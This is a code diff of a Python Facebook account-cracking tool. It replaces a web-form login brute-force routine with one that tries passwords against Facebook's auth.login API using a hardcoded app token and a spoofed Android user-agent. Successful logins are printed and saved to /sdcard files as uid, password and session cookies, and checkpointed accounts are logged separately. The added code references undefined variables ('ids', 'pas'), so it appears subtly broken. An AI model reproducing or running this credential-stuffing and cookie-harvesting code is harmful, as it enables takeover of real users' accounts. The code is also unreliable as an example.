@@ -209,65 +209,48 @@ def innocent():
     linex()
     
 def mumitx(uid,pwx,tl):
-    global loop
-    global cps
     global oks
-    global proxy
+    global cps
+    global loop
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[PARVEJ-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
-            
-                cek_apk(session,coki)
-                open('/sdcard/PARVEJ-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                if 'y' in cp_cpx: 
-                 print('\r\r\033[1;30m[PARVEJ-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/PARVEJ-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
+            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m [COOKIES] '+coki)
+                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
+                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
+                        os.makedirs("/sdcard/SAFIDY-IDS")
+                    # Enregistrer dans le fichier SAFIDY-OK.txt
+                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
+                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier SAFIDY-CP.txt
+                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mPARVEJ\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
     except:
         pass
 
-#-----[Run Menu]-----#
-mumit_menu()
